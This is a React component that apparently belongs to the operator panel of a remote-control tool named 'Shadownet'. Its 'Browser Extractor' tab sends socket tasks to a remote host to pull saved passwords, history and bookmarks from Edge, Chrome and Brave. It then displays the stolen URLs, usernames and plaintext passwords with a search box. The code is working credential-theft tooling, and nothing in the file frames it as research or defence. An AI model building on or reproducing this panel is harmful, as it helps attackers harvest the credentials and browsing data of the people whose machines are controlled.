/** @format */

import { useDispatch } from "react-redux";
import { startSocketTasksAction } from "@/lib/slices/ShadownetSlices";
import { useEffect, useState } from "react";
import { Input } from "@/components/ui/input";
import { SearchIcon } from "lucide-react";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { cn } from "@/lib/utils";
import { format } from "date-fns";

const Browser = ({ id, socketState, socketStream, setSocketStream }) => {

	const [active, setActive] = useState(null);
	const [search, setSearch] = useState("");
	const [subtabValue, setSubTabValue] = useState("none");

	const [filteredPasswordList, setFilteredPasswordList] = useState(null);
	const [filteredHistoryList, setFilteredHistoryList] = useState(null);
	const [filteredBookmarksList, setFilteredBookmarksList] = useState(null);

	const dispatch = useDispatch();

	const handleExtract = (type) => {
		dispatch(
			startSocketTasksAction({
				id: id,
				task: "browser_extractor",
				command: {
					browser: active,
					type: type,
				},
			})
		);
	};

	const handleFilter = () => {
		if (subtabValue === "passwords") {
			const filteredList =
				socketStream &&
				socketStream.filter(
					(item) =>
						item.url.toLowerCase().includes(search.toLowerCase()) ||
						item.username.toLowerCase().includes(search.toLowerCase()) ||
						item.password.toLowerCase().includes(search.toLowerCase())
				);
			setFilteredPasswordList(filteredList);
		} else if (subtabValue === "history") {
			const filteredList =
				socketStream &&
				socketStream.filter((item) =>
					item[1].toLowerCase().includes(search.toLowerCase())
				);
			setFilteredHistoryList(filteredList);
		} else if (subtabValue === "bookmarks") {
			const filteredList =
				socketStream &&
				socketStream.filter(
					(item) =>
						item[1].toLowerCase().includes(search.toLowerCase()) ||
						item[2].toLowerCase().includes(search.toLowerCase())
				);
			setFilteredBookmarksList(filteredList);
		}
	};

	useEffect(() => {
		if (socketStream) {
			handleFilter();
		}
	}, [socketStream, search]);

	useEffect(() => {
		if (active) {
			setSubTabValue("none");
			setFilteredPasswordList(null);
			setFilteredHistoryList(null);
			setFilteredBookmarksList(null);
		}
	}, [active]);

	useEffect(() => {
		return () => setSocketStream(null);
	}, []);

	return (
		<div className="w-full flex flex-col">
			<div className="flex w-full gap-8 flex-col bg-muted/30 lg:p-4 rounded-xl">
				<div className="flex flex-col gap-1">
					<h3 className="font-semibold">Browser Extractor</h3>
					<h6 className="text-sm text-muted-foreground">
						Extract browser content such as saved passwords, history and
						cookies.
					</h6>
					<h6 className="text-sm text-muted-foreground">
						Note: Only supported browsers are available below. These may or may
						not be installed on the host system.
					</h6>
				</div>
			</div>
			<div className="w-full flex flex-col gap-5 bg-muted/30 p-4 rounded-xl min-h-[60vh]">
				<div className="w-full flex gap-1 h-9">
					<div
						className={
							active === "edge"
								? "w-40 px-4 rounded-md py-2 bg-muted-foreground/30 flex items-center justify-center font-semibold"
								: "w-40 px-4 rounded-md py-2 bg-muted-foreground/10 hover:bg-muted-foreground/30 cursor-pointer flex items-center justify-center hover:font-semibold"
						}
						onClick={() => setActive("edge")}
					>
						<h4 className="text-sm">Microsoft Edge</h4>
					</div>
					<div
						className={
							active === "chrome"
								? "w-40 px-4 rounded-md py-2 bg-muted-foreground/30 flex items-center justify-center font-semibold"
								: "w-40 px-4 rounded-md py-2 bg-muted-foreground/10 hover:bg-muted-foreground/30 cursor-pointer flex items-center justify-center hover:font-semibold"
						}
						onClick={() => setActive("chrome")}
					>
						<h4 className="text-sm">Google Chrome</h4>
					</div>
					<div
						className={
							active === "brave"
								? "w-40 px-4 rounded-md py-2 bg-muted-foreground/30 flex items-center justify-center font-semibold"
								: "w-40 px-4 rounded-md py-2 bg-muted-foreground/10 hover:bg-muted-foreground/30 cursor-pointer flex items-center justify-center hover:font-semibold"
						}
						onClick={() => setActive("brave")}
					>
						<h4 className="text-sm">Brave Browser</h4>
					</div>
				</div>
				{active && (
					<div className="w-full max-h-[35vh]">
						<Tabs
							value={subtabValue}
							onValueChange={(e) => setSubTabValue(e)}
							defaultValue="none"
							className={cn(
								"flex flex-col items-start gap-5 w-full",
								!active && "pointer-events-none"
							)}
						>
							<div className="w-full flex flex-col lg:flex-row items-center gap-2">
								<TabsList className="bg-muted-foreground/10 w-full justify-start gap-1 p-1 lg:flex-row flex-col h-full">
									<TabsTrigger
										className="w-full justify-start lg:justify-center lg:w-40 hover:bg-background hover:text-foreground py-1"
										value="passwords"
										onClick={() => handleExtract("passwords")}
									>
										PASSWORDS
									</TabsTrigger>
									<TabsTrigger
										className="w-full justify-start lg:justify-center lg:w-40 hover:bg-background hover:text-foreground py-1"
										value="history"
										onClick={() => handleExtract("history")}
									>
										HISTORY
									</TabsTrigger>
									<TabsTrigger
										className="w-full justify-start lg:justify-center lg:w-40 hover:bg-background hover:text-foreground py-1"
										value="bookmarks"
										onClick={() => handleExtract("bookmarks")}
									>
										BOOKMARKS
									</TabsTrigger>
								</TabsList>
								<div className="relative flex lg:w-fit w-full items-center">
									<Input
										placeholder="Search"
										spellCheck={false}
										className="w-full lg:w-80 rounded-md bg-muted-foreground/10 border-none h-9 p-2 pl-3"
										value={search}
										onChange={(e) => setSearch(e.target.value)}
									/>
									<SearchIcon size={16} className="absolute right-3" />
								</div>
							</div>
							<TabsContent value="passwords" className="w-full">
								<div className="relative w-full h-[50vh] flex flex-col rounded-xl">
									<div className="flex flex-col w-full gap-2 h-[45vh] overflow-scroll scrollbar-hide">
										{filteredPasswordList &&
											filteredPasswordList.map((cred, id) => (
												<div
													className="w-full flex flex-col gap-3 bg-muted/30 p-4 rounded"
													key={id}
												>
													<div className="w-full flex flex-col">
														<code className="text-sm">URL</code>
														<code className="text-sm text-muted-foreground">
															<a
																href={cred.url}
																target="_blank"
																className="hover:text-foreground"
															>
																{cred.url}
															</a>
														</code>
													</div>
													<div className="w-full flex flex-col">
														<code className="text-sm">Username</code>
														<code className="text-sm text-muted-foreground">
															{cred.username}
														</code>
													</div>
													<div className="w-full flex flex-col">
														<code className="text-sm">Password</code>
														<code className="text-sm text-muted-foreground">
															{cred.password}
														</code>
													</div>
												</div>
											))}
									</div>
									<div className="absolute right-0 bottom-2 flex items-center gap-2">
										<h3 className="text-sm text-muted-foreground">
											Available:
										</h3>
										<h3 className="text-sm text-muted-foreground">
											{filteredPasswordList ? filteredPasswordList.length : 0}
										</h3>
									</div>
								</div>
							</TabsContent>
							<TabsContent value="history" className="w-full">
								<div className="relative w-full h-[50vh] flex flex-col rounded-xl">
									<div className="flex flex-col w-full gap-2 h-[45vh] overflow-scroll scrollbar-hide">
										{filteredHistoryList &&
											filteredHistoryList.map((hist, id) => (
												<div
													className="w-full bg-muted/30 p-2 rounded"
													key={id}
												>
													<div className="w-full flex flex-col gap-1">
														<code className="text-sm text-muted-foreground">
															{format(new Date(hist[0]), "LLL do, HH:mm")}
														</code>
														<code className="text-sm">
															<a
																href={hist[1]}
																target="_blank"
																className="hover:text-muted-foreground"
															>
																{hist[1]}
															</a>
														</code>
													</div>
												</div>
											))}
									</div>
									<div className="absolute right-0 bottom-2 flex items-center gap-2">
										<h3 className="text-sm text-muted-foreground">
											Available:
										</h3>
										<h3 className="text-sm text-muted-foreground">
											{filteredHistoryList ? filteredHistoryList.length : 0}
										</h3>
									</div>
								</div>
							</TabsContent>
							<TabsContent value="bookmarks" className="w-full">
								<div className="relative w-full h-[50vh] flex flex-col rounded-xl">
									<div className="flex flex-col w-full gap-2 h-[45vh] overflow-scroll scrollbar-hide">
										{filteredBookmarksList &&
											filteredBookmarksList.map((hist, id) => (
												<div
													className="w-full bg-muted/30 p-2 rounded"
													key={id}
												>
													<div className="w-full flex flex-col gap-1">
														<div className="w-full flex items-center justify-between">
															<code className="text-sm text-muted-foreground">
																{hist[2]}
															</code>
															<code className="text-sm text-muted-foreground">
																{format(new Date(hist[0]), "LLL do, HH:mm")}
															</code>
														</div>
														<code className="text-sm">
															<a
																href={hist[1]}
																target="_blank"
																className="hover:text-muted-foreground"
															>
																{hist[1]}
															</a>
														</code>
													</div>
												</div>
											))}
									</div>
									<div className="absolute right-0 bottom-2 flex items-center gap-2">
										<h3 className="text-sm text-muted-foreground">
											Available:
										</h3>
										<h3 className="text-sm text-muted-foreground">
											{filteredBookmarksList ? filteredBookmarksList.length : 0}
										</h3>
									</div>
								</div>
							</TabsContent>
						</Tabs>
					</div>
				)}
			</div>
		</div>
	);
};

export default Browser;
